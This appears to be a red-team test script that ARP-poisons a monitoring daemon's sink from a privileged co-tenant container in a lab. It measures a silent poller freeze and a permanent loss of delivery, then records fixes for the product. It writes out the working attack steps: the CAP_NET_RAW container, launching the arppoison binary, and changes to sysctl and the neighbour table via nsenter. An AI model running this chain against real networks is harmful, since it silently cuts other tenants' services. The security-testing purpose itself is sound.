#!/usr/bin/env bash
# vagrant/scenarios/rt-11-5-l2-delivery-kill.sh — RT-11: L2 kill of the
# delivery path (docs/redteam-plan.md row rt-11-5).
#
# The chain: a privileged co-tenant (CAP_NET_RAW) sibling container on the
# same bridge as the daemon sends gratuitous ARP replies claiming the SINK
# endpoint's IP resolves to a poison MAC nobody owns. The daemon's
# established TCP to the sink blackholes: no RST, no FIN — the kernel just
# retransmits. The premise: "the daemon looks healthy while delivering
# nothing"; the guard: "delivery-failure counters make the blind visible".
#
# THE MEASURED SHAPE (probe, 2026-11-25) is stronger, and the scenario runs
# it in two phases:
#
#   phase 1 — THE FREEZE (retries2=8, ~100s window): delivery dies at the
#   poison moment (segments never land), but the Write keeps SUCCEEDING
#   locally while SO_SNDBUF absorbs envelopes; once the buffer fills, the
#   Write blocks — and flushEnvelope runs on the POLL goroutine
#   (pkg/xtcp/poller.go:150 → dest.Send → conn.Write, no write deadline),
#   so the whole poller freezes for the retransmit window: no polls, no
#   error counters, nothing at the catcher, metrics 200. FULLY silent. At
#   the prod default (tcp_retries2=15) the freeze is ~15.4 min. De-poison
#   mid-window unblocks the Write and the buffered envelopes drain — the
#   catcher catches up with ZERO error counters (measured: 3354 lines/6s)
#   — no records lost, the blind is only visible as LATENCY.
#
#   phase 2 — THE PERMANENT BLIND (retries2=3, ~1.4s window): the
#   retransmit window closes fast; the conn errors, envelopeFlush/error +
#   destTCP/Write/error light up (the row's visibility premise holds — but
#   only AFTER the silent window), polls RESUME, and delivery stays dead
#   forever: tcpDest never reconnects (the pinned finding, #339).
#
# Deploy shape: the sink gets its own docker0 alias (XTCP2_SINK_IP
# 172.17.99.2 — far from docker's sequential IPAM) so poisoning it leaves
# the gateway path (the published metrics/gRPC listeners via docker-proxy)
# clean; poisoning 172.17.0.1 itself takes the API down with it (measured).
set -euo pipefail

: "${XTCP2_MODE:=bridge}"
: "${XTCP2_AUTH:=raw}"
: "${XTCP2_ATTACKER:=plain}"
: "${XTCP2_PPROF:=0}"
: "${XTCP2_SINK_IP:=172.17.99.2}"
XTCP2_EXPECT="${XTCP2_EXPECT:-CONFIRMED}"

# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/matrix.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/evidence.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/ssh.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/deploy.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/invariant.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/assert.sh"

xtcp2_matrix_defaults
xtcp2_preflight
evidence_init

echo "rt-11-5: evidence in $RT_EVIDENCE"

xtcp2_deploy victim attacker
wait_for 120 "daemon answers on the victim VM" vm_exec victim \
  "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9088/metrics | grep -qE '^(200|401|403)\$'"
victim_still_reporting_tap
xtcp2_victim_read_token

# --- helpers -------------------------------------------------------------------

SINK="$XTCP2_SINK_IP"

daemon_pid() { vm_exec victim "sudo docker inspect rt-xtcp2 --format '{{.State.Pid}}'"; }
DPID="$(daemon_pid)"

mval() { # mval <series substring> — one xtcp_counts series' value
  vm_exec victim "curl -s -m 6 -H 'Authorization: Bearer $RT_READ_TOKEN' http://127.0.0.1:9088/metrics | grep '$1' | grep -v '^#' | grep -oE '[0-9.e+]+\$' | head -1" || echo 0
}

scrape_code() {
  vm_exec victim "curl -s -m 6 -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer $RT_READ_TOKEN' http://127.0.0.1:9088/metrics" || true
}

catcher_delta_6s() {
  local a b
  a="$(catcher_lines)"
  sleep 6
  b="$(catcher_lines)"
  echo $((b - a))
}

polls_issued() { mval 'pollRequestCh'; }

error_counters() {
  vm_exec victim "curl -s -m 6 -H 'Authorization: Bearer $RT_READ_TOKEN' http://127.0.0.1:9088/metrics | grep -E 'error.*envelopeFlush|destTCP.*error' | grep -v '^#'" || true
}

# --- baseline --------------------------------------------------------------------

B_DELTA="$(catcher_delta_6s)"
B_POLLS="$(polls_issued)"
ok "baseline: catcher=$B_DELTA lines/6s polls=$B_POLLS scrape=$(scrape_code)"

# --- the killer -------------------------------------------------------------------

vm_exec_root victim "sysctl -w net.ipv4.tcp_retries2=8 >/dev/null; nsenter -t $DPID -n sysctl -w net.ipv4.tcp_retries2=8"
vm_exec victim "sudo docker rm -f rt-l2killer >/dev/null 2>&1; sudo docker run -d --name rt-l2killer --cap-add NET_RAW --network bridge ubuntu:24.04 sleep infinity" >/dev/null
vm_exec victim "sudo docker cp /opt/xtcp2-redteam/bin/arppoison rt-l2killer:/tmp/arppoison" >/dev/null
vm_exec victim "sudo docker exec rt-l2killer sh -c 'nohup /tmp/arppoison -iface eth0 -ip $SINK -interval 200ms > /tmp/ap.log 2>&1 &'" >/dev/null
sleep 3

NEIGH="$(vm_exec_root victim "nsenter -t $DPID -n ip neigh show | grep -E '$SINK|172.17.0.1' || true")"
echo "rt-11-5: neighbor entries: $NEIGH"
if echo "$NEIGH" | grep "$SINK" | grep -q "02:00:00:00:00:ff"; then
  ok "the poison flipped the daemon's neighbor entry for the sink ($SINK -> 02:00:00:00:00:ff; gratuitous ARP against an existing entry — no arp_accept needed)"
else
  not_ok "the poison did not flip the sink's neighbor entry — see evidence"
fi
if echo "$NEIGH" | grep "172.17.0.1" | grep -qv "02:00:00:00:00:ff"; then
  ok "the gateway entry is untouched (the sink-only shape: the API path stays clean)"
else
  not_ok "the gateway entry was poisoned too — see evidence"
fi

# --- phase 1: the freeze -----------------------------------------------------------

DELTA="$(catcher_delta_6s)"
if [ "$DELTA" -le 10 ]; then
  ok "phase 1: the catcher is dark within a cycle of the poison ($DELTA lines/6s) — the daemon is delivering nothing"
else
  not_ok "phase 1: the catcher kept flowing ($DELTA lines/6s) — the poison failed; see evidence"
fi

code="$(scrape_code)"
if [ "${code:-000}" = 200 ]; then
  ok "phase 1: the daemon LOOKS healthy while delivering nothing (scrape 200 — the premise)"
else
  not_ok "phase 1: the scrape degraded (code=${code:-000}) — see evidence"
fi

# The freeze: after SO_SNDBUF fills (~10-30s of envelopes), the Write blocks
# and the poller stops issuing polls. Two samples 8s apart, equal = frozen.
frozen() {
  local a b
  a="$(polls_issued)"
  sleep 8
  b="$(polls_issued)"
  [ "$a" = "$b" ]
}
wait_for 150 "the poller freezes in the blocked Write (polls stop issuing; prod default would freeze ~15.4 min)" frozen
F1_POLLS="$(polls_issued)"
sleep 6
F2_POLLS="$(polls_issued)"
if [ "$F1_POLLS" = "$F2_POLLS" ]; then
  ok "phase 1: THE FREEZE — the poller is stuck in the destination Write (polls=$F1_POLLS frozen over 14s: no polls, no counters, metrics 200 — fully silent; the delivery Write has no deadline and runs on the poll goroutine)"
else
  not_ok "phase 1: polls kept issuing during the hold ($F1_POLLS -> $F2_POLLS) — no freeze; see evidence"
fi
if [ -z "$(error_counters)" ]; then
  ok "phase 1: zero error counters while dark and frozen — the blind is NOT detectable from the daemon's own metrics during the silent window"
else
  not_ok "phase 1: error counters fired without the window closing — see evidence"
fi

# --- de-poison mid-window: the graceful recovery ------------------------------------

vm_exec victim "sudo docker exec rt-l2killer pkill -f arppoison" >/dev/null 2>&1 || true
vm_exec_root victim "nsenter -t $DPID -n ip neigh del $SINK dev eth0" >/dev/null 2>&1 || true
sleep 8
CATCHUP="$(catcher_delta_6s)"
if [ "$CATCHUP" -gt 0 ]; then
  ok "de-poison mid-window: the blocked Write completes, the buffered envelopes drain, the catcher catches up ($CATCHUP lines/6s) — no error counters, no records lost (the blind was LATENCY, not loss)"
else
  not_ok "de-poison mid-window: the catcher did not catch up — see evidence"
fi
if [ -z "$(error_counters)" ]; then
  ok "de-poison mid-window: zero error counters (the recovery is silent too)"
else
  not_ok "de-poison mid-window: unexpected error counters — see evidence"
fi

# --- phase 2: the window closes — the permanent blind --------------------------------

vm_exec_root victim "nsenter -t $DPID -n sysctl -w net.ipv4.tcp_retries2=3" >/dev/null
vm_exec victim "sudo docker exec rt-l2killer sh -c 'nohup /tmp/arppoison -iface eth0 -ip $SINK -interval 200ms > /tmp/ap2.log 2>&1 &'" >/dev/null
sleep 12 # the retransmit window (retries2=3) closes, the conn errors, flushes error fast
E_BEFORE="$(mval 'error.*envelopeFlush')"
sleep 6
E_AFTER="$(mval 'error.*envelopeFlush')"
W_ERR="$(mval 'destTCP.*error')"
P2_POLLS="$(polls_issued)"
echo "rt-11-5: phase 2: envelopeFlush/error $E_BEFORE->$E_AFTER destTCP/Write/error=$W_ERR polls=$P2_POLLS"
if [ "${E_AFTER:-0}" -gt "${E_BEFORE:-0}" ] && [ "${W_ERR:-0}" -gt 0 ]; then
  ok "phase 2: after the window closes, the delivery-error counters light up (envelopeFlush/error $E_BEFORE->$E_AFTER) — the blind becomes VISIBLE (the row's premise)"
else
  not_ok "phase 2: no delivery-error counters after the window closed — see evidence"
fi
sleep 6
P3_POLLS="$(polls_issued)"
if [ "$P3_POLLS" -gt "$P2_POLLS" ]; then
  ok "phase 2: polls resumed after the error (the freeze is once-per-blackhole; the daemon keeps polling with delivery dead)"
else
  not_ok "phase 2: polls stayed frozen after the error — see evidence"
fi
DELTA="$(catcher_delta_6s)"
if [ "$DELTA" -le 10 ]; then
  ok "phase 2: THE PERMANENT BLIND — delivery stays dead (catcher $DELTA lines/6s; tcpDest never reconnects, #339) until a daemon restart"
else
  not_ok "phase 2: the catcher recovered on its own (no reconnect exists — reconcile this) — see evidence"
fi

victim_alive_check() {
  vm_exec victim "sudo docker inspect rt-xtcp2 --format '{{.State.Running}}' | grep -q true"
}
if victim_alive_check; then
  ok "the daemon process survives the whole attack (both phases)"
else
  not_ok "the daemon died — see evidence"
fi

# --- teardown ------------------------------------------------------------------------

vm_exec victim "sudo docker rm -f rt-l2killer" >/dev/null
vm_exec_root victim "sysctl -w net.ipv4.tcp_retries2=15 >/dev/null; nsenter -t $DPID -n sysctl -w net.ipv4.tcp_retries2=15" >/dev/null 2>&1 || true

# --- verdict -------------------------------------------------------------------------

# CONFIRMED, stronger than the premise: the L2 kill does not just blind
# delivery while the daemon looks healthy — it freezes COLLECTION for the
# whole retransmit window with zero error signal (the Write has no deadline
# and runs on the poll goroutine), and the window's close leaves delivery
# permanently dead (no reconnect). Product findings pinned: a write deadline
# + an async flush queue.
finish rt-11-5 CONFIRMED
